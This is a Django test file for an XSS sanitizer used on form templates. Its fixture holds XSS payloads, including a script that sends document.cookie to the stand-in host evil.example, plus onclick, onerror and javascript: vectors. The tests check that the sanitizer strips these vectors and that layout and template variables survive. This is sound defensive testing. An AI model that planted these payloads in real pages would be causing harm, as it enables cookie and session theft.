"""
Form template XSS sanitization tests (security audit 2026-07, M-2).
"""
from django.test import TestCase
from rest_framework.test import APIClient

from core.models import User
from tenants.models import Tenant

from .models import FormTemplate
from .sanitizer import sanitize_template_html
from .variables import replace_variables_in_html

MALICIOUS_HTML = (
    '<style>@page { size: A5 } body > p { color: red }</style>'
    '<h1 style="color:blue" onclick="steal()">Intake {{workitem.reference_id}}</h1>'
    '<script>fetch("https://evil.example/" + document.cookie)</script>'
    '<a href="javascript:alert(1)">click</a>'
    '<img src="x" onerror="alert(1)">'
    '<table><tr><td colspan="2">{{customer.full_name}}</td></tr></table>'
)


class SanitizerTests(TestCase):
    def test_strips_script_vectors(self):
        out = sanitize_template_html(MALICIOUS_HTML)
        self.assertNotIn('<script', out)
        self.assertNotIn('onclick', out)
        self.assertNotIn('onerror', out)
        self.assertNotIn('javascript:', out)

    def test_keeps_print_layout(self):
        out = sanitize_template_html(MALICIOUS_HTML)
        # CSS survives raw, including combinators
        self.assertIn('@page { size: A5 }', out)
        self.assertIn('body > p { color: red }', out)
        self.assertIn('style="color:blue"', out)
        self.assertIn('colspan="2"', out)
        # template variables survive
        self.assertIn('{{workitem.reference_id}}', out)
        self.assertIn('{{customer.full_name}}', out)

    def test_variable_values_are_escaped(self):
        html = '<p>{{customer.full_name}}</p>'
        out = replace_variables_in_html(
            html, {'customer.full_name': '<img src=x onerror=alert(1)>'}
        )
        self.assertNotIn('<img', out)
        self.assertIn('&lt;img', out)


class TemplateStorageSanitizationTests(TestCase):
    @classmethod
    def setUpTestData(cls):
        cls.tenant = Tenant.objects.create(name="Shop", subdomain="shop")

    def test_model_save_sanitizes(self):
        template = FormTemplate.objects.create(
            tenant=self.tenant,
            name="Intake",
            form_type=FormTemplate.FORM_TYPE_INTAKE,
            html_content=MALICIOUS_HTML,
        )
        template.refresh_from_db()
        self.assertNotIn('<script', template.html_content)
        self.assertNotIn('onclick', template.html_content)
        self.assertIn('{{workitem.reference_id}}', template.html_content)


class PreviewSanitizationTests(TestCase):
    @classmethod
    def setUpTestData(cls):
        cls.tenant = Tenant.objects.create(name="Shop", subdomain="shop")
        # Superuser passes the manage_templates has_perm check.
        cls.user = User.objects.create_superuser(
            username="admin@shop.test",
            email="admin@shop.test",
            password="test-password",
        )
        cls.user.tenant = cls.tenant
        cls.user.save(update_fields=["tenant"])

    def setUp(self):
        self.client = APIClient()
        self.client.login(email="admin@shop.test", password="test-password")

    def test_preview_anonymous_reflects_sanitized_html_only(self):
        resp = self.client.post(
            "/api/documents/templates/preview_anonymous/",
            {"html_content": MALICIOUS_HTML},
            format="json",
            HTTP_X_TENANT="shop",
        )
        self.assertEqual(resp.status_code, 200)
        body = resp.content.decode()
        self.assertNotIn('<script', body)
        self.assertNotIn('onclick', body)
        self.assertNotIn('javascript:', body)
        # sample data got substituted and layout survived
        self.assertIn('RMA-12345', body)
        self.assertIn('@page { size: A5 }', body)
